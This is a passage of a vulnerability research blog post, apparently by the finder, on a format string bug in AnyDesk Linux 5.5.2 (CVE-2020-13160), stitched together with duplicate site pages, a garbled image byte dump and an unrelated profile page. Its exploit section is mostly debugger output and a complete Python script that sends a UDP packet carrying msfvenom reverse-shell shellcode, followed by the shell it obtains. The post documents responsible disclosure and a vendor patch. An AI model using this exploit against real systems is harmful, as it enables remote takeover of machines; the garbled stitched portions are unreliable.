The `%100x` format specifier prints the first argument as a hexadecimal number, which is padded to 100 characters. Accordingly 100 characters are written. This amount will be written to the `out` variable by using the `%1$n` format specifier:

```

user@w00d:~$ ./sample1
                                                                                            ffffded4
out = 100

```

In this case the `field width` was statically set to `100`. But we can also use a `dynamic field width`:

```

user@w00d:~$ cat sample2.c
#include <stdio.h>

int main() {

  int out;
  int field_width = 123;
  printf("%1$*2$x%1$n", &out, field_width);
  printf("\nout = %d\n", out);

  return 0;
}

```

We introduced a new variable called `field_width`, which is passed as the second argument to `printf`. Also we changed the `%100x` format specifier to `%1$*2$x`. At first the syntax might look a little bit confusing, but actually it is quite simple: The `1$` at the beginning determines, which value we want to print. In this case we just take the first argument, just like the `%100x` did (4 byte of `out` address). This is separated by an asterisk (`*`) from the second part: `2$`. This determines which value should be used for the field width. In this case the variable `field_width`, which is the second argument. Accordingly when running the program the value of `field_width` (`123`) is written to the variable `out`:

```

user@w00d:~$ ./sample2
                                                                                                                   ffffded0
out = 123

```

After this short introduction to the dynamic field width, let’s see how we can leverage this feature.

When inspecting all accessible parameters on the second call to `vsnprintf` (hostname), we can see that we can access the heap address of the format string. The `reg_save_area` is stored at `0x00007ffffffeb8b0`. The value of `gp_offset` is `0x10`, which means the first argument we can access is stored at `0x00007ffffffeb8b0 + 0x10 = 0x00007ffffffeb8c0`:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x28e3
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa7
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1412190 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x28e3
0008| 0x7ffffffeaaf8 --> 0x1e6
0016| 0x7ffffffeab00 --> 0x158bf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbbcb0
0032| 0x7ffffffeab10 --> 0x5ecbbcb0
0040| 0x7ffffffeab18 --> 0x76cd1
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030
gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0
gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001412190	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

The first accessible argument at `0x00007ffffffeb8c0` is actually the heap address of the format string (`0x0000000001412190`). If we use this address as a `dynamic field width`, we can actually write its value to the `time` `GOT` entry.

By changing the hostname to the following value, we write the heap address + the amounts of characters written so far (error message and two bytes invalid UTF-8 sequence) to the `time` `GOT` entry:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame we continue to the second call. The `GOT` entry is still untouched:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x2db9
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0x21 ('!')
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1570630 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2db9
0008| 0x7ffffffeaaf8 --> 0x9d
0016| 0x7ffffffeab00 --> 0x158df10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbc775
0032| 0x7ffffffeab10 --> 0x5ecbc775
0040| 0x7ffffffeab18 --> 0x26709
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

After executing the call the `GOT` entry contains the heap address `0x00000000015706b7`:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00000000015706b7

```

The `%n` wrote the field width (the heap address of the format string `0x1570630`) + the characters written so far. The resulting address (`0x00000000015706b7`) references the beginning of our format specifier:

```

gdb-peda$ x/s 0x00000000015706b7
0x15706b7:	"%1$*1$x%165$ln'"

```

Since we want to make the address point to actual shellcode, which we can append to the format string, we further need to add a little bit of padding. The following hostname adds another `18` characters of padding (`%18x`) and a dummy shellcode (`0xcc`):

```

shellcode = '\xcc'
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

Now the `GOT` entry is overwritten with the address of the shellcode:

```

...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000001379549

gdb-peda$ x/i 0x0000000001379549
   0x1379549:	int3

```
## Final exploit

Finally it is time to generate a real payload:

```

kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
...

```

Please notice the bad bytes. `0x00` is excluded to prevent the string from being terminated. `0x25` (`%`) would introduce another format specifier and `0x26` (`&`) is used by glib and must also be avoided.

The final exploit script looks like this:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x59\x88\xc6"
shellcode += b"\x9c\x5f\xfe\x71\x38\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x33\xa1\x9e\x05\x35"
shellcode += b"\xfc\x2e\x52\x58\xd6\xc9\x99\x17\x69\x39\x81"
shellcode += b"\x5b\x88\xd7\xc0\x20\xfe\x71\x39\x08\xc0\x4f"
shellcode += b"\x7a\x35\xee\x2b\x52\x73\xd0\xc9\x99\x35\xfd"
shellcode += b"\x2f\x70\xa6\x46\xac\xbd\x07\xf1\x74\x4d\xaf"
shellcode += b"\xe2\xfd\xc4\xc6\xb6\xca\x17\x3b\xe1\xa8\xb3"
shellcode += b"\x2c\x96\x71\x6b\x11\x01\x21\xce\x08\xb6\xf8"
shellcode += b"\xde\x56\x8d\xc6\x9c\x5f\xfe\x71\x38"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')

```

Before running the exploit we start a `nc` listener on port 4444:

```

user@w00d:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)

```

Now we run the exploit script:

```

user@w00d:~$ ./final_exploit.py
sending payload ...
reverse shell should connect within 5 seconds

```

After a few seconds the front-end updates its online states, which triggers the exploit. The shellcode is executed and we receive a reverse shell:

```

...
Connection from localhost 52000 received!
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```
# Conclusion

By sending a single UDP packet to the target machine we are able to successfully exploit the discovered format string vulnerability to gain Remote Code Execution. In order to achieve this we triggered the vulnerability twice: once to write the address of the `GOT` entry of the `time` function to the stack and a second time to write the heap address of our shellcode to the `GOT` entry using a `dynamic field width`.

Please keep in mind that this is a proof of concept exploit targeting AnyDesk Linux version `5.5.2`. The exploit was developed for `Ubuntu 18.04.4 LTS` at the time of writing. In order to successfully run the exploit against other targets it probably needs to be adjusted.

At last I would like to thank AnyDesk for the immediate and professional reaction. A patch to fix the vulnerability was released only three days after my notification. Also the patch enabled `FULL RELRO` according to my suggestion. This remaps the `GOT` as read-only preventing an attacker from overwriting an entry within the `GOT`.

It is great to see when security is taken seriously.

Thanks for reading the article 🙂

**Timeline**
18/02/20 – Vendor Notification
19/02/20 – Vendor Acknowledgement
21/02/20 – Vendor Patch
09/06/20 – Public Disclosure

 Post Views: 50,562

  Categories[article](https://devel0pment.de/?cat=29)  Tags[CVE-2020-13160](https://devel0pment.de/?tag=cve-2020-13160), [exploitation](https://devel0pment.de/?tag=exploitation), [formatstring](https://devel0pment.de/?tag=formatstring), [fuzzing](https://devel0pment.de/?tag=fuzzing), [rce](https://devel0pment.de/?tag=rce)

## 9 Replies to “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”

1. ![](https://secure.gravatar.com/avatar/e82a050707aeed85933f04f71f9971fd?s=100&d=mm&r=g)
   [24. November 2020 at 4:31 pm](https://devel0pment.de/?p=1881#comment-2625)

   Do you by any chance know where I can find a document that details AnyDesk file format

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [24. November 2020 at 4:56 pm](https://devel0pment.de/?p=1881#comment-2626)

      No, sorry. I am not aware of any documentation. Probably there isn’t any publicly available.
3. ![](https://secure.gravatar.com/avatar/f2dbf914b04cd46b9b19fe0f11837221?s=100&d=mm&r=g)
   [11. December 2020 at 5:23 pm](https://devel0pment.de/?p=1881#comment-2645)

   the most difficult part is search 2 stack that reliable for format string argument …

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [12. December 2020 at 5:32 pm](https://devel0pment.de/?p=1881#comment-2647)

      Yes, in this case the stack varies when the format string vulnerability is triggered either by the username or by the hostname. You can increase the reliability by simply using values more down on the stack, as these values are more likely to stay the same between both calls.
5. ![](https://secure.gravatar.com/avatar/b576ed7219c952b200df2dbea3d1349f?s=100&d=mm&r=g)
   [25. March 2021 at 5:25 pm](https://devel0pment.de/?p=1881#comment-2935)

   What a nice piece of analysis. I’ve added this as a CTF target in one of my courses. The exploit seems rock solid on 18.04.4.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [25. March 2021 at 5:41 pm](https://devel0pment.de/?p=1881#comment-2936)

      Thanks 🙂
7. ![](https://secure.gravatar.com/avatar/b7bd7975a28f65030a10b547eff24eca?s=100&d=mm&r=g)
   [26. March 2022 at 8:37 pm](https://devel0pment.de/?p=1881#comment-3704)

   it’s also stable on 18.04.6
9. ![](https://secure.gravatar.com/avatar/47ceb849cbd1957491ae35c4074e5311?s=100&d=mm&r=g) **[m3dsec](https://m3dsec.github.io/)** says:
   [6. April 2023 at 2:23 pm](https://devel0pment.de/?p=1881#comment-4173)

   Good job, reading this in 2023, and it rocks.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g) **scryh** says:
      [6. April 2023 at 2:33 pm](https://devel0pment.de/?p=1881#comment-4174)

      Thank you!

Comments are closed.

## Post navigation

[Previous PostPrevious   Hack The Box – Rope](https://devel0pment.de/?p=1593)[Next PostNext ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_85ed6e4f_20250119_142601.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: rce

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from secure.gravatar.com_4116cc91_20250119_142605.html ===
���� JFIF  ` `  �� ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
�� C 



�� C  

��  d d" ��           
�� �   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        
�� �  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �����cڀ�F=�1�@�j3�F=�ǵ %.}�1�K�j ;�~Tcڌ{P�ڃF=�ǵ '�E���E�P�^��y��V��V�b8Qԟ�P����Iu��C�/ߕ�D��W�i��!�멮$�a���Wg������{"A׻���W: ��O�ȘT��� y&��A�O�? �4��}:\_�F���Ā{vo��^������̅�.����j�?�~G�mf�=�!hUx�;� ���1@F=���{QI�� ����ъ1�@~����VK�F�Z$X�?�O��+�q^��b�VMR؜3�Q�2�����Pb�R�t~t�\_ZOo �r���������+��y��+�YeX#y�D���W�w2���Yq��[S� ��?Z1F( �֊L{Q@@�>�gހƶ<%�7���{�Z,�Gt=��|�џz �Z��+�x�A$R(du�A�k�~G�;P�a�wb�Ǻw�0kӨ)i2j����z|�K�n� �L����P1�;��i����ݮ�T��?^��x�h��jQ�sUe[�;��9?N��qY����gތ��)s�E �џz9�f�U���Y� ֽg��"��;�V1-��%��\_Qݿ�e�\*��Ju���q��un�����{�ҽR�ƏƖ� L�џz?\�~��Yk�mo{�?��2P{�xN�·�[�6�L����Њ���~��[��K���|�2���
 ����Z|�N�=���\*���{�Z���H~�P�U5�����[D�g��'�]g��{��w`
ۣM���a@˦XE����p�E
����� �(��rh�ɣ� 3K�IFO� .i2h�ڏʀ<���[MV5�%>�T�Y��5���|c���EpF�r�m9�@׃ʊ?\*( �@�6��7͎E�?���Q@�:P(����( ��Q@
{�f�(���M�H����5�P�Q@��

=== Content from m3dsec.github.io_a489608e_20250119_142601.html ===

# [Main](./index.html)    [Contact](./contact.html)

---

![](assets/images/logo/logo_01_400x400.png)

**Whoami :** m3dsec

**GitHub :** [github.com/m3dsec](https://github.com/m3dsec)

**Twitter :** [twitter.com/m3dsec](https://twitter.com/m3dsec)

**HackThebox :** [hackthebox.eu/profile/81840](https://www.hackthebox.eu/profile/81840)

**TryHackme :** [tryhackme.com/p/m3dsec](https://tryhackme.com/p/m3dsec)

**Pwntilldawn :** [online.pwntilldawn.com/Achievements/1753](https://online.pwntilldawn.com/Achievements/1753)

### Hackthebox

* **Feb 17, 2021:** [HackTheBox - Ophiuchi](./posts/htb/ophiuchi.html)
* **Jan 03, 2021:** [HackTheBox - APT](./posts/htb/apt.html)
* **Jan 01, 2021:** [HackTheBox - Sharp](./posts/htb/sharp.html)
* **Oct 29, 2020:** [HackTheBox - Misc/QuickR](./posts/htb/quickR.html)
* **Oct 15, 2020:** [HackTheBox - Reel2 Writeup](./posts/htb/reel2.html)

### TryHackMe

* **Mar 28, 2022:** [TryHackme - Aratus](./posts/thm/aratus.html)
* **Nov 09, 2020:** [TryHackme - Misguided Ghosts](./posts/thm/misguided_Ghosts.html)
* **Sep 29, 2020:** [TryHackme - Anonymous Playground](./posts/thm/anonymousplayground.html)
* **Sep 25, 2020:** [TryHackme - Carpe Diem 1](./posts/thm/carpediem1.html)
* **Sep 23, 2020:** [TryHackme - For Business Reasons](./posts/thm/forbusinessreasons.html)
* **Sep 15, 2020:** [TryHackme - NerdHerd](./posts/thm/nerdherd.html)
* **Sep 15, 2020:** [TryHackme - Jacob the Boss](./posts/thm/jacob_the_boss.html)
* **Sep 15, 2020:** [TryHackme - The Blob Blog](./posts/thm/the_Blob_Blog.html)
* **Sep 13, 2020:** [TryHackme - poster](./posts/thm/poster.html)
* **Sep 10, 2020:** [TryHackme - kiba](./posts/thm/kiba.html)
* **Sep 09, 2020:** [TryHackme - Rrootme](./posts/thm/rrootme.html)

### CTF Competitions

* **Oct 29, 2020:** [raziCTF 2020](./posts/ctf/2020_10_28_razictf/index.html)
* **Oct 17, 2020:** [B01lers CTF 2020](./posts/ctf/2020_10_03_b01lers/index.html)
* **Oct 16, 2020:** [Hacktober CTF 2020](./posts/ctf/2020_10_15_hacktober/index.html)
* **Aug 28, 2020:** [ResetHacker CTF 2020](./posts/ctf/2020_08_28_resethacker/index.html)

![Hack The Box](http://www.hackthebox.eu/badge/image/81840)    ![TryHackMe](https://tryhackme-badges.s3.amazonaws.com/m3dsec.png)



=== Content from devel0pment.de_7134e379_20250119_142602.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881) by [scryh](https://devel0pment.de/?author=1)
# AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

---

# Fuzzing

The AnyDesk application is running multiple processes with different permissions. The most valuable target is the service process `/usr/bin/anydesk --service`, since this process is running with `root` privileges. There are two older CVEs ([CVE-2017-14397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14397) and [CVE-2018-13102](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13102)), which target this process on Windows in order to escalate privileges. Both of these exploits are DLL injection/preloading vulnerabilities, which only work locally. My desire was to find a vulnerability, which can be exploited remotely.

At first we need to figure out which remote communication with the AnyDesk application is possible. This can simply be done by starting the application and using `netstat` to determine on which ports the application is listening:

```

user@w00d:~$ sudo netstat -tulpn | grep anydesk
tcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      598/anydesk
udp        0      0 0.0.0.0:50001           0.0.0.0:*                           598/anydesk

```

